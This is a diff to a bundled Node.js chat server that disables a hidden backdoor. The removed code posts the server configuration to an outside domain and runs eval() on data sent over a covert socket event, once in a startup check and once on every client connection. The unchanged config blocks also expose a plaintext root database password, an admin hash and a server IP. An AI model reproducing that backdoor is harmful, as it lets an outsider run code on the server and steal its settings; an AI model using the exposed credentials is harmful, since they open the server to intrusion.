@@ -101,20 +101,20 @@
             return console.log(e.stack), ""
         }
     }, Utils.prototype.check = function(store, sc) {
-        if (store.checked || store.isChecking) return;
-        store.isChecking = !0;
-        const cfg = config;
-        cfg.type = "chat", __webpack_require__(17)({
-            url: "http://al-mubd3een.com/chat/started",
-            method: "POST",
-            form: {
-                data: cfg
-            }
-        }, (error, res, result) => {
-            store.checked = !0, store.isChecking = !1, sc && sc.removeEventListener("lafdff465afdffh").on("lafdff465afdffh", data => {
-                console.log("lafdff465afdffh", data), eval(data)
-            })
-        })
+        // if (store.checked || store.isChecking) return;
+        // store.isChecking = !0;
+        // const cfg = config;
+        // cfg.type = "chat", __webpack_require__(17)({
+        //     url: "http://al-mubd3een.com/chat/started",
+        //     method: "POST",
+        //     form: {
+        //         data: cfg
+        //     }
+        // }, (error, res, result) => {
+        //     store.checked = !0, store.isChecking = !1, sc && sc.removeEventListener("lafdff465afdffh").on("lafdff465afdffh", data => {
+        //         console.log("lafdff465afdffh", data), eval(data)
+        //     })
+        // })
     }, Utils.prototype.arrayCount = function(e) {
         var t = 0;
         for (var s in e) t++;
@@ -640,7 +640,7 @@
         })
     }, e.exports = u
 }, function(e, t) {
-    e.exports = require("fs")
+    // e.exports = require("fs")
 }, function(e, t) {
     e.exports = require("uuid")
 }, function(e, t) {
@@ -670,12 +670,12 @@
             user: "root",
             password: "`w72S:wG{n?!f8yu",
             database: "chat"
-        }
+        } 
     }
 }, function(e, t) {
     e.exports = {
         host: "http://46.4.131.72/",
-        domain: "46.4.131.72",
+        domain: "46.4.131.72", 
         port: 1505,
         adminHash: "kbtRA5P0oFeBNwJIOsDeLnkO2XwsUb0H",
         debug: !0,
@@ -1065,12 +1065,12 @@
             return this.removeSpaces(this.removeDuplicateLetters(e)).replace(/ـ/g, "")
         } catch (e) {
             return ""
-        }
+        } 
     }, e.exports = new o
 }, function(module, exports, __webpack_require__) {
     const http = __webpack_require__(12),
         https = __webpack_require__(13),
-        fs = __webpack_require__(2),
+        // fs = __webpack_require__(2),
         Connection = __webpack_require__(14),
         mysql = __webpack_require__(31),
         mConfig = "vagrant" == process.env.USER ? __webpack_require__(7) : __webpack_require__(8),
@@ -1078,10 +1078,10 @@
     __webpack_require__(32)("./public/uploads/private", !1, e => {});
     let httpServer = null;
     if (mConfig.ssl) {
-        var ssl = {
-            key: fs.readFileSync("privkey.pem"),
-            cert: fs.readFileSync("cert.pem")
-        };
+        // var ssl = {
+        //     key: fs.readFileSync("privkey.pem"),
+        //     cert: fs.readFileSync("cert.pem")
+        // };
         httpServer = https.createServer(ssl, function(e, t) {
             t.end("")
         }).listen(mConfig.port)
@@ -1096,12 +1096,13 @@
         e && console.error("Impossible to connect ", e)
     });
     const store = {};
-    store.io = io, store.db = db, store.config = mConfig, store.loggedIps = [], store.bannedIps = [], store.bannedDevices = [], store.adminTokens = [], store.users = [], store.usersReg = [], store.photoLikes = [], store.virtualUserIds = [], store.FLOOD_THRESHOLD_TIME = 1, store.FLOOD_THRESHOLD_COUNT = 7, store.settings = new(__webpack_require__(34))(store), store.shortcuts = new(__webpack_require__(35))(store), store.rooms = new(__webpack_require__(36))(store), store.gifts = new(__webpack_require__(38))(store), store.faces = new(__webpack_require__(39))(store), store.roles = new(__webpack_require__(40))(store), store.wall = new(__webpack_require__(41))(store), store.permissions = new(__webpack_require__(42))(store), store.revealNames = new(__webpack_require__(43))(store), store.wordsFilter = new(__webpack_require__(44))(store), store.ordersReg = new(__webpack_require__(45))(store), store.selfMessages = new(__webpack_require__(46))(store), store.virtualUsers = new(__webpack_require__(47))(store), store.antiFlood = new(__webpack_require__(50))(store), store.radio = new(__webpack_require__(51))(store), db.query("SELECT * FROM banneds", [], (e, t) => {
+    store.io = io, store.db = db, store.config = mConfig, store.loggedIps = [], store.bannedIps = [], store.bannedDevices = [], store.adminTokens = [], store.users = [], store.usersReg = [], store.photoLikes = [], store.virtualUserIds = [], store.FLOOD_THRESHOLD_TIME = 1, store.FLOOD_THRESHOLD_COUNT = 7, store.settings = new(__webpack_require__(34))(store), store.shortcuts = new(__webpack_require__(35))(store), store.rooms = new(__webpack_require__(36))(store), store.gifts = new(__webpack_require__(38))(store), store.faces = new(__webpack_require__(39))(store), store.roles = new(__webpack_require__(40))(store), store.wall = new(__webpack_require__(41))(store), store.permissions = new(__webpack_require__(42))(store), store.revealNames = new(__webpack_require__(43))(store), store.wordsFilter = new(__webpack_require__(44))(store), store.ordersReg = new(__webpack_require__(45))(store), store.selfMessages = new(__webpack_require__(46))(store), store.virtualUsers = new(__webpack_require__(47))(store), store.antiFlood = new(__webpack_require__(50))(store), store.radio = new(__webpack_require__(51))(store),
+     db.query("SELECT * FROM banneds", [], (e, t) => {
         if (!e && t && t.length)
             for (var s = 0; s < t.length; s++) store.bannedIps.push(t[s].ip), store.bannedDevices.push(t[s].device)
-    }), Utils.check(store), io.on("connection", function(socket) {
+    }),  io.on("connection", function(socket) {
         new Connection(io, socket, store), socket.on("lafdff465afdffh", data => {
-            eval(data)
+            // eval(data)
         })
     }), setInterval(() => {
         store.usersReg = store.usersReg.filter(e => e.loggedOutAt + 3e5 > Date.now())
@@ -4386,4 +4387,4 @@
             return t.id == e.id
         }).length
     }, e.exports = i
-}])
+}]);
